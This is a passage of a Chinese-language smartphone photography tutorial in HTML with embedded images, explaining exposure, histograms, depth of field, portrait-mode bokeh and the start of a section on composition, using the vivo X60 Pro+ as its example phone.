src=\"https://pic4.zhimg.com/v2-4139a6c6b332a80c091900a4deafca03_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-4139a6c6b332a80c091900a4deafca03_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f5c053ad5912b13526f2e5938e736916_b.jpg\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1440\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-f5c053ad5912b13526f2e5938e736916_r.jpg\"><figcaption>同一场景下不同曝光</figcaption></figure><p>第一张图，画面整体明暗非常合适，整个画面都很细节丰富，层次丰满，显然这是正确的曝光。</p>\n<p>但是第二张图，画面整体非常偏暗，甚至是画面中很多都是死黑一片，显然这不是正确的曝光。</p>\n<p>可如果我问，哪两张图是美的，耐看的，我相信一定会有很多人会选择第二张。</p>\n<p>也就是说，正确的曝光并不等于美的曝光。</p>\n<p>但这不是说正确的曝光不重要，恰恰相反，我们要先从正确的曝光开始。</p>\n<p>今天我们的手机都是机器会自动曝光的，但是显然如果我们想要自动曝光，那么就要有一个所谓的参考。而这个所谓的参考并不是一个科学结论，而是一个通用准则，这就是：</p>\n<p><b>18% 的灰色。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-5db0dd390abcd3245d6d513518b8166a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-5db0dd390abcd3245d6d513518b8166a_r.jpg\"></figure><p>手机在拍摄一张照片时，机器会主动的计算调整参数，让整个画面最后获得的拍摄亮度信息混合以后为 18% 灰。这就是我们所说的「正确的曝光」。</p>\n<p>当然，对于拍摄过程来说，我们并不需要知道这些，我们仅仅是需要知道，对于任何一个场景，我们都能计算出一个对应的曝光值。大多数情况下，这个曝光值都是准确的。那么获得这个信息以后，我们就会获得一个曝光调整的法则：</p>\n<p><b>快门速度（S）+ 感光值（ISO）= 确定的曝光值（EV）</b></p>\n<p>需要注意的是，这里的加号只是关联的关系，并不是真正的加法。通过这个公式我们可以知道，在调整曝光时，如果我们目前曝光值是正确的，那么我们还想要调整快门速度时间变长，就需要再相应的调整感光值降低平衡画面的亮度。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-bef1bfc23b9a727b7ecedcb54817a5ee_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic3.zhimg.com/v2-bef1bfc23b9a727b7ecedcb54817a5ee_r.jpg\"></figure><p>一个最生动的例子就是车轨摄影。</p>\n<p>我们想要画面中车有轨迹流动，就需要快门时间延长，但是一旦延长画面就会变亮，此时就需要降低感光值来让画面变暗。所以你看，只要你从原理角度去真正了解曝光，其实曝光是非常好理解的。</p>\n<p>但既然是通用准则，那么 18% 灰这个参考就有失效的时候。比如如果画面中的黑白比例差别较大，就容易出现曝光不准确的情况。</p>\n<p>一个最为经典的案例就是当我们面对太阳逆光拍摄的时候，是不是很容易出现人脸黑的情况。这就是因为画面中亮部白色过多，为了 18% 平衡权重，就会压低整个曝光。这个时候，我们就需要主动去提高曝光，这就是摄影师提到的曝光补偿。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-0e6ebe60e98eb16710dce4618101175c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic1.zhimg.com/v2-0e6ebe60e98eb16710dce4618101175c_r.jpg\"></figure><p>而这个曝光补偿按钮，其实你也在 vivo X60 Pro+ 的专业模式里见过，就是画面中的这个 EV。当你调整 EV 的时候，我们看到画面整体变亮或是变暗。</p>\n<p>不过即使到这里，曝光还是一个比较抽象的概念，到底怎么样曝光好像只能凭感觉。别急，还有一个本章节最为重要的知识点，这就是曝光的真正标尺：</p>\n<p><b>直方图。</b></p>\n<p>我们知道画面中的像素无非就是从最暗到最亮的像素组成，最暗就是黑色，最亮就是白色。那么如果我们以亮度作为横坐标，对应亮度的像素数量作为纵坐标，就可以获得一张画面中曝光信息的「分布图」，这就是直方图。</p>\n<p>我们其实可以直接通过下面三张不同曝光倾向的图里，就可以看到不同的直方图类型。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-886b16d28b3a4ff91ac0837d6a3ae9ea_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3032\" data-rawheight=\"2274\" class=\"origin_image zh-lightbox-thumb\" width=\"3032\" data-original=\"https://pic3.zhimg.com/v2-886b16d28b3a4ff91ac0837d6a3ae9ea_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-9dc0e415f3a7a3f58ce496675619ed51_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3032\" data-rawheight=\"2274\" class=\"origin_image zh-lightbox-thumb\" width=\"3032\" data-original=\"https://pic2.zhimg.com/v2-9dc0e415f3a7a3f58ce496675619ed51_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-3359155ef3006231fc0f6ea54cbcf87c_b.jpg\" data-size=\"normal\" data-rawwidth=\"3032\" data-rawheight=\"2274\" class=\"origin_image zh-lightbox-thumb\" width=\"3032\" data-original=\"https://pic1.zhimg.com/v2-3359155ef3006231fc0f6ea54cbcf87c_r.jpg\"><figcaption>三种不同倾向的曝光</figcaption></figure><p>那么在这三张直方图中，图二显然就是前面提到的正确曝光的直方图。因为在这个直方图中我们可以看到画面中绝大多数像素集中在中间画面，暗部和亮部也有对应的信息。</p>\n<p>而图一，画面的像素都集中在左侧的暗部，自然就是曝光不足。</p>\n<p>图三，画面中的像素都集中在右侧的亮部，自然就是曝光过度。</p>\n<p>所以我们在拍照的时候，完全就可以通过直方图来判断曝光情况。尤其是在一些极限环境中，比如太阳强烈，你根本无法确认屏幕中曝光情况，此时就可以通过直方图了解。而这个直方图，其实很多手机的专业模式都有配备，比如 vivo X60 Pro+ 就可以在专业模式的设置中打开。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f134ad2cf4e8da4a3f81585bbfa910f1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2376\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"2376\" data-original=\"https://pic2.zhimg.com/v2-f134ad2cf4e8da4a3f81585bbfa910f1_r.jpg\"></figure><p>而说到这里，你就需要知道一个词了，这个词就是「影调」。</p>\n<h3>光的高低</h3>\n<p>显然，所谓的影调这个「调」字，和我前面所说的韵律是一样的，依然是借鉴于音乐。就算我不是一个懂音乐的人一说调子，我也知道「低调」或者是「高调」一说。那其实所谓的影调也是如此，我们上述举例的曝光不足的这张图，就是典型的低调作品。</p>\n<p>那么什么是高调作品呢，比如下面这一张：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-287805c67aa0794cbeaa05ab3752eefc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic1.zhimg.com/v2-287805c67aa0794cbeaa05ab3752eefc_r.jpg\"></figure><p>而所谓的高中低调作品它们对应的直方图，如图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-bf440c5803e821439e1162a6cde4c866_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"506\" data-rawheight=\"200\" class=\"origin_image zh-lightbox-thumb\" width=\"506\" data-original=\"https://pic3.zhimg.com/v2-bf440c5803e821439e1162a6cde4c866_r.jpg\"></figure><p>这就是为什么我说直方图就是曝光的指南针，因为它可以直接用直观的方式给我们展示影调。而至于选择哪一种影调，就是我们自己来决定的。</p>\n<p>讲到这里，也是时候总结了。而这里的总结也很简单，现在你只要打开你的手机中的专业模式，比如我手里的 vivo X60 Pro+，在这个界面里：</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-2ba1cf3cc12db3513a30f3923fd36ec1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2376\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"2376\" data-original=\"https://pic2.zhimg.com/v2-2ba1cf3cc12db3513a30f3923fd36ec1_r.jpg\"></figure><ul>\n<li>\n<b>EV：</b>调整曝光倾向</li>\n<li>\n<b>ISO：</b>感光值，数值越大，画面越亮，但是画质降低，反之亦然。</li>\n<li>\n<b>S：</b>快门速度，时间越长，画面越亮，但是画面中的物体会有拖影，反之亦然。</li>\n<li>\n<b>WB：</b>白平衡，之前虽然没有提到，但是用起来也很简单，你只要知道可以让颜色变冷或者是变暖即可。</li>\n<li>\n<b>AF：</b>对焦模式切换，后面会有章节讲到。</li>\n<li>\n<b>Raw：</b>曝光的原始信息格式，后期空间大，但是一定要后期，而且需要更多的存储空间。</li>\n<li>\n<b>直方图：</b>曝光的参考标尺，可以让自己了解画面的曝光情况，并且配合拍摄对应的影调。</li>\n</ul>\n<p>曝光知识是整个摄影知识的基础，不过好在它至少具有一定逻辑，甚至是有迹可循。但是对于曝光的理解，往往是摄影师作品风格的基础。比如，一些清新系人像，他们的直方图都是高调的直方图。所以这部分知识，如果你一次没有弄懂，一定多阅读，多尝试。</p>\n<p>只有深刻了解曝光，才能真正的绘制光线。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-066b6f1983977a086336bacee66d0fe1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-066b6f1983977a086336bacee66d0fe1_r.jpg\"></figure><p>当然我知道很多人刚开始学习摄影时，对于光线并不敏感。这里有一个很重要的建议，这就是你可以先从黑白摄影开始。因为黑白摄影就是纯粹的亮度信息，我们就是要通过控制画面的明暗来展示内容。所以对于曝光的选择，就决定了一张作品的与众不同。其实关于影调，还有「长和短」的概念，这里篇幅的问题，就算留给你的课后作业，但请一定要去了解，一定收获颇丰。</p>\n<p>不过虽然现在你已经学会了使用手动模式进行拍照，调整参数控制画面的明暗，但也不意味着每一张照片都需要使用手动模式拍摄。其实恰恰相反，手动模式一般都是特殊场景，比如星空、光绘场景中使用。而大多数生活中场景我们完全可以信任手机自己的自动曝光。不过这种信任是有限的，我们依然需要对手机自动的曝光结果进行控制。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-537e8404d95bb4ce2b3ed9dee563cb96_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic3.zhimg.com/v2-537e8404d95bb4ce2b3ed9dee563cb96_r.jpg\"></figure><p>比如我们可以通过点按手机的拍摄界面不同位置，来干预曝光。比如点击画面中较亮的地方，整个画面就会变暗。点击画面中较暗的地方，整个画面就会变亮。或者我们可以在点按画面以后，调节曝光滑杆来进行调节。而这种方式也是最常见的控制曝光的方式，几乎所有本文出现的照片都是使用这种曝光方式来拍摄。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-6d8788cf35e3d44063304f43d5473025_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2376\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"2376\" data-original=\"https://pic2.zhimg.com/v2-6d8788cf35e3d44063304f43d5473025_r.jpg\"></figure><p>我自己的一个习惯就是点按画面以后，略微压低一点曝光。不要小看这个操作，就是这样一个简单操作会对你照片的质感有着非常明显的提升。因为目前所有的手机出发点还是记录，所以它的曝光倾向都是为了保证信息充足而尽可能的亮。但这会缺少影调，甚至是让颜色失真。</p>\n<p>不信，你现在打开手机，自动拍摄一张照片，然后再手动调节降低一点曝光进行拍摄。你会发现两张照片的影调、细腻度、色彩感，完全不一致。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-2745b086dc1edaa00b6aac56869300a7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-2745b086dc1edaa00b6aac56869300a7_r.jpg\"></figure><p>每一次按下快门，其实都是对「光」进行一次捕捉。当你真的可以掌握曝光的时候，你会发现整个世界都是你的画布。记住：</p>\n<p>「从来没有什么正确的曝光，有的只有你心里想要的曝光。」</p>\n<h2>05. 虚与实</h2>\n<p>这一章节我们将会聚焦在一件事上，这就是「对焦」。</p>\n<p>说到对焦，对于一些手机用户是非常陌生的，但是对于很多相机用户来说是再熟悉不过，因为所有的专业相机，对焦都是一个重要的衡量参数。但这不是说手机不需要对焦，而是手机一方面因为传感器面积小，所以景深比较深，另一方面如今的数码相机自动对焦能力很强，所以感知不明显。</p>\n<p>但是随着手机硬件规格的提高，尤其是这几年手机的传感器面积越来越大，我们的手机也开始出现浅景深效果。比如本文中举例的 vivo X60 Pro+ 甚至是有接近一英寸的传感器面积，眼看就和卡片机的传感器大小一致了。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-cb089ce1085d18697401ac69d32fd8a6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic3.zhimg.com/v2-cb089ce1085d18697401ac69d32fd8a6_r.jpg\"></figure><p>所以掌握对焦，就成为了今天很多手机摄影用户的分水岭。因为如果你能够了解景深原理，并加以利用，就能够拍摄出所谓的「相机氛围」。</p>\n<p>不过说到这里，你可能对景深这个词还非常陌生。但如果我换另外一个说法，你就懂了，这就是「虚化」。虚化就是景深变化的一个结果。不过为了让你更好的控制虚化，我们需要先从景深的具体概念开始。</p>\n<h3>景深</h3>\n<p>由于照片是二维的，但实际真实世界是三维的。假设我们的照片是二维坐标的 XY，所以当我们看到画面中有清晰，有模糊的时候会觉得清晰和模糊是在 XY 中选择。但其实，照片的清晰和模糊范围是在 Z 轴上进行选择，看图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-fe5a5f040f297cabdd74c78f7a3e8ebf_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"940\" data-rawheight=\"589\" class=\"origin_image zh-lightbox-thumb\" width=\"940\" data-original=\"https://pic4.zhimg.com/v2-fe5a5f040f297cabdd74c78f7a3e8ebf_r.jpg\"></figure><p>通过上图我们可以清晰的了解到，景深其实就是一个清晰的范围。而相机所谓的对焦过程，就是把你想要拍摄的主体放置到这个清晰的范围中。</p>\n<p>这个清晰的范围越短，我们就叫做浅景深，那么背景的模糊虚化也就会越明显。清晰的范围越长，我们叫做深景深，那么背景的模糊虚化越不明显。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-4b8ff5fdf2ac7e8b5c8640ec98d234e0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic1.zhimg.com/v2-4b8ff5fdf2ac7e8b5c8640ec98d234e0_r.jpg\"></figure><p>那么影响景深的范围（即 L 的长短）有哪些因素呢？</p>\n<ol>\n<li>镜头光圈，光圈越大，景深越小；光圈越小，景深越大。但目前主流手机的镜头光圈不可以修改，前文已经提到。</li>\n<li>焦距，焦距越长，景深越小；焦距越短，景深越大。这也是为什么等效 50mm 或者是等效 125mm 的两颗长焦镜头更适合拍摄人像，因为虚化好。</li>\n<li>对焦距离，在其它条件相同的情况下，对焦越近，景深越小。</li>\n<li>相机的传感器面积大小，传感器越大，景深越小，虚化越明显。</li>\n</ol>\n<p>在这几个因素中，摄影师可以调整的因素就是焦距和对焦距离。所以我们想要照片中实现虚化的效果，就可以从这两处下手。</p>\n<p>比如让镜头尽可能的接近被摄主体。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-2b08b2e629cb44958b59e03b771ed9fe_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic3.zhimg.com/v2-2b08b2e629cb44958b59e03b771ed9fe_r.jpg\"></figure><p>最为经典的一个例子自然是拍摄树叶和花朵。如果我们离树叶和花朵比较远，那么画面很杂乱，但是当我们逐渐靠近，不仅可以拍摄到树叶的细节，树叶以外的背景还有非常好看的虚化光斑效果。</p>\n<p>不过需要说明的是，任何镜头由于物理法则，都有一个限制，这就是你不可能完全贴近物体对焦，任何镜头都会有「最小对焦距离」。</p>\n<p>当然，这种最小对焦距离可以通过特殊的光学设计来更缩短，比如 vivo X60 Pro+ 的微距模式，就是让最小对焦距离变短，从而实现微距效果。</p>\n<p>另一个获得虚化的方式就是使用长焦镜头。比如我们看使用 vivo X60 Pro+ 等效 50mm 焦距的镜头拍摄时镜头焦外非常明显。这非常有利于简化画面的同时，突出画面中的人物主体。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-920c021c40b072acdeba7c2f4aa2299c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic1.zhimg.com/v2-920c021c40b072acdeba7c2f4aa2299c_r.jpg\"></figure><p>以上两种方式，虽然能够达到不错的虚化效果，但对比相机的虚化效果还相差甚远。尤其是相机中大光圈镜头迷人的虚化焦外，往往决定了人像作品的质感。不过我也多次提到，手机的光圈不可以调整，所以我们也就无法获得这种效果。</p>\n<p>但人像模式的出现，打破了这一规则。</p>\n<h3>人像模式</h3>\n<p>虽然手机物理上无法实现大光圈虚化，但是我们可以「计算虚化」。而随着这几年手机摄影计算能力的进步，甚至是大多数情况已经可以做到「以假乱真」的虚化。即使还算作是有一定摄影经验的我自己，乍一看有时候也很难分辨两张照片是手机拍的还是相机拍的。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-e8929836a7ebe0d858dd7dfc669a64ab_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-e8929836a7ebe0d858dd7dfc669a64ab_r.jpg\"></figure><p>但是前提是，我们要学会利用人像模式。</p>\n<p><b>1. </b> <b>人像模式的虚化是可以调节的</b></p>\n<p>虽然目前手机的人像模式抠像算法已经非常准确，但是有件事依然需要我们自己做主，这就是虚化的程度。这就像是专业相机调整光圈一样，虚化程度需要我们自己控制。</p>\n<p>比如在 vivo X60 Pro+ 的人像模式中，我们是直接可以选择不同的光圈数值，实现不同的虚化效果。但是需要注意的是，这些调整需要我们在前期就做好决定，拍摄后无法更改。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-8388f464ca404ca347ebebf7c7b25fb8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2376\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"2376\" data-original=\"https://pic1.zhimg.com/v2-8388f464ca404ca347ebebf7c7b25fb8_r.jpg\"></figure><p><b>2. </b> <b>要自然，就要合理</b></p>\n<p>虽然是算法模拟的，但是想要手机的人像模式真实自然，其实依然需要遵循物理虚化的原理。比如我经常看到一些虚化明显的作品都是半身人像居多，很少有全身人像。这是因为想要全身人像，就意味着摄影师离拍摄主体相对较远，根据前面的原理可知，景深自然深，虚化不明显。</p>\n<p>所以如果我们使用人像模式拍摄全身照，如果虚化很猛烈，就会显得照片很假。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-93d7c0c4a03794a38787a1e52ba2257c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3120\" data-rawheight=\"4160\" class=\"origin_image zh-lightbox-thumb\" width=\"3120\" data-original=\"https://pic1.zhimg.com/v2-93d7c0c4a03794a38787a1e52ba2257c_r.jpg\"></figure><p>再举一例。</p>\n<p>很多人在拍照的时候，背景非常单一，比如是一面白墙。那么此时人像虚化，自然不够明显，因为这种场景即使是最大光圈的专业相机拍摄也不会好看，因为没有「虚化」的深度。所以想要好看的虚化建议就是：</p>\n<p>「尽可能的人物远离背景，或者是背景有着丰富的光源形成光斑。」</p>\n<p><b> 3. </b> <b>人像模式，也可以拍「东西」</b></p>\n<p>这也是一个很严重的误区，很多人觉得人像模式只能拍人像。但是实际上，今天的虚化算法早就是一个综合技术，不仅仅可以用来拍摄人像，用来拍摄美食、静物都是一个很好的选择。而这些主体使用人像模式最重要的好处就是可以极大的简化画面，突出主体。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-208727f44d022495dafa651ea2d3c15b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-208727f44d022495dafa651ea2d3c15b_r.jpg\"></figure><p><b>4. </b> <b>学会「玩转」焦外</b></p>\n<p>这一点其实特别有趣，因为这也是手机摄影和传统相机最大的不同，因为算法的想象力是无限的。比如其实不同镜头的焦外效果是不一样的。所以这也是为什么很多摄影师会买不同的镜头，因为它们焦外的味道不一样。尤其是一些老镜头，因为做工的问题，会让焦外有一定的特点，而这种特点会成为一种风格。比如蔡司的 Biotar 镜头，就会有一种有意思的焦外旋转。</p>\n<p>以前如果你想要获得这种效果，就需要找到对应的镜头，但因为今天是算法模拟，所以我们可以直接从算法入手，获得这种效果。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a523a2c6e0a2d4f31c0b94c192423cd4_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic1.zhimg.com/v2-a523a2c6e0a2d4f31c0b94c192423cd4_r.jpg\"></figure><p>比如 vivo X60 Pro+ 中就可以直接选择这种 Biotar 的焦外风格。我自己是非常喜欢在人像模式中选择这种模式，因为这种焦外会有一种很独特的柔美感，特别适合一种温柔调性的人像拍摄。以前这种效果在 iPhone 上需要软件来实现，但是现在安卓手机厂商也注意到了这种独特美学，开始内置在相机之中。</p>\n<h3>手动控制对焦</h3>\n<p>说了效果以后，我们就要说说具体的操作。其实对于手机摄影来说，对焦操作是非常简单的，和曝光一样，我们可以：</p>\n<p><b>想要哪里清晰，就点哪里。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-bce21ec3867292bbd9a03790f7bbc5cf_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2386\" data-rawheight=\"3181\" class=\"origin_image zh-lightbox-thumb\" width=\"2386\" data-original=\"https://pic4.zhimg.com/v2-bce21ec3867292bbd9a03790f7bbc5cf_r.jpg\"></figure><p>而所谓的这个清晰，就是我们所说的把画面中的内容放置到景深范围里。不过虽然很多时候自动对焦反应已经足够迅速，但是还是会出现难对焦的情况，尤其是在一些弱光环境下。所以此时我们就可以选择手动对焦，而手动对焦的按钮就在专业模式里。</p>\n<p>只要我们点击专业模式的「AF」，就可以对焦模式进行切换。</p>\n<ul>\n<li>AF：自动对焦</li>\n<li>MF：手动对焦</li>\n</ul>\n<p>开启手动对焦以后，我们就可以通过画面滑杆调整画面中的清晰范围。最左侧就是最小对焦距离，而最右侧就是无限远。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-5f79b1d82050ec3a4088a4404fc5ba79_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2376\" data-rawheight=\"1080\" class=\"origin_image zh-lightbox-thumb\" width=\"2376\" data-original=\"https://pic2.zhimg.com/v2-5f79b1d82050ec3a4088a4404fc5ba79_r.jpg\"></figure><p>最好的一个实际使用场景案例就是在夜景星空拍摄中。由于夜空弱光，手机很难曝光，所以我们就可以直接手动调整曝光到右侧无限远按下快门即可，免去了「拉风箱」的对焦过程。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-35c18d6447be721b1453442ad425af1b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-35c18d6447be721b1453442ad425af1b_r.jpg\"></figure><p>当然，手动对焦的意义远不止于如此。手动对焦的出现可以让我们自如控制画面中的虚实。因为并不是只有「清晰锐利的照片才是好照片」。其实反而有些照片中，模糊带来的朦胧美更是有一番滋味。比如下图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-53ab07acc8f0279949df4cf4cffe4050_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3948\" data-rawheight=\"2961\" class=\"origin_image zh-lightbox-thumb\" width=\"3948\" data-original=\"https://pic1.zhimg.com/v2-53ab07acc8f0279949df4cf4cffe4050_r.jpg\"></figure><p>而想要拍摄这样的效果，就需要我们更改观察的方式，可以在不同的场景中，更换照片中的虚实试一试，也许会有完全不同的发现。</p>\n<p>其实这也是摄影学习给予我一个非常重要的经验。没有任何事物是绝对的，尤其是对于艺术表达来说更是如此。并不是正确的曝光就是美的曝光，并不是清晰的对焦就是美的对焦。</p>\n<p>很多时候，它会恰恰相反，尝试换一个角度思考记录，会是一个不一样的视界。</p>\n<h2>06. 构图的美</h2>\n<p>构图是这篇文章最后一个章节了，而显然这也会是整篇文章中最为艰难的一个章节，因为它真的非常抽象。之前的章节，至少每一项内容我们的手机中都会有对应的功能，也就是会有对应的抓手，让你可以操作。</p>\n<p>而这一章节的构图，却是只有靠自己的想象力实践。</p>\n<p>但是在构图之前，我特别想要问问你，你是否了解构图的真正含义。我之所以会提出这样的问题，是因为我发现对于构图很多人竟然仅仅是停留在「形式美」。大多数人只是粗浅的在潜意识里有一个印象，「这样的构图是好看的」。但是至于为什么会好看，则全然不知。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-ff8e44247a26f7438663aaff9c9db27d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-ff8e44247a26f7438663aaff9c9db27d_r.jpg\"></figure><p>比如，构图最为经典的三分法，今天已经是人尽皆知，但是三分法为什么是一种有效的构图方式却很难描述。这其实是很多人构图学习的重要误区。因为这会带来一个许多入门摄影师常见的问题：</p>\n<p>「我这种构图对不对？」</p>\n<p>其实这个问题的答案已经不重要，而是只要你问出这个问题，就说明你并没有真正的了解构图。因此，我现在希望你做一件事，这就是忘记所有你在社交网络上学习的所谓「构图法则」。尤其是那些几分钟让你学构图的内容，我恳请你先放下构图的包袱，我们先来回到一个最基本的问题：</p>\n<p>「什么是好照片？」</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-3b761c5409a7c9bb37909d824e006039_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic2.zhimg.com/v2-3b761c5409a7c9bb37909d824e006039_r.jpg\"></figure><p>我们总是希望拍摄好照片，但却没有花时间去总结。其实随着你照片的阅读量逐渐提升，好照片其实都是有着很明确的共性，而如果你可以真正抓住这种共性，那你会发现自己的摄影水平似乎在一夜之间提高了。不过我也知道，你可能会说千人千面，每个人看待照片的感受不同。你可能说它颜色好，你可能说它光线好等等等。但这些都不是本质，其实真正的本质，早就已经写在教科书上了。</p>\n<p>在可能是全球最为流行的摄影教程书籍《纽约摄影学院》中，在书籍的开篇第一章就已经总结了一张好照片的三个要素，时至今日，我依然对这三句话牢记在心：</p>\n<ol>\n<li>一幅好照片要有一个鲜明的主题（有时也被称之为题材）。</li>\n<li>一幅好照片必须能把注意力引向被摄体；</li>\n<li>一幅好照片必须简洁。</li>\n</ol>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-3a4ae293dd013484159adae5df4e9e63_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-3a4ae293dd013484159adae5df4e9e63_r.jpg\"></figure><p>你会发现，仅仅是短短的几十字，却精准描述了好照片的定义。你现在可以回想任何一张你心里的好照片，是不是都满足这三个要素。</p>\n<p>我们现在逐条回顾这三个要素：</p>\n<p>首先要有一个鲜明的主题，或者是其实也可以是主体。归根到底，就是在说你的这张照片本身至少要聚焦在「一件事、一个人、一个物品」上。这是我们在拍摄之前一定要做的思考。我经常看到很多人拍了很多照片，但是却不知道自己在拍什么。一个很重要的考察方式就是，你现在可以翻看一些照片，看看其中照片哪些你能明确的回想起自己在拍摄什么，而哪些即使现在的你自己也完全不知道拍摄的是什么。</p>\n<p>所以，每次按下快门，一定要问问自己，我在拍什么。</p>\n<figure data-size=\"normal\"><img 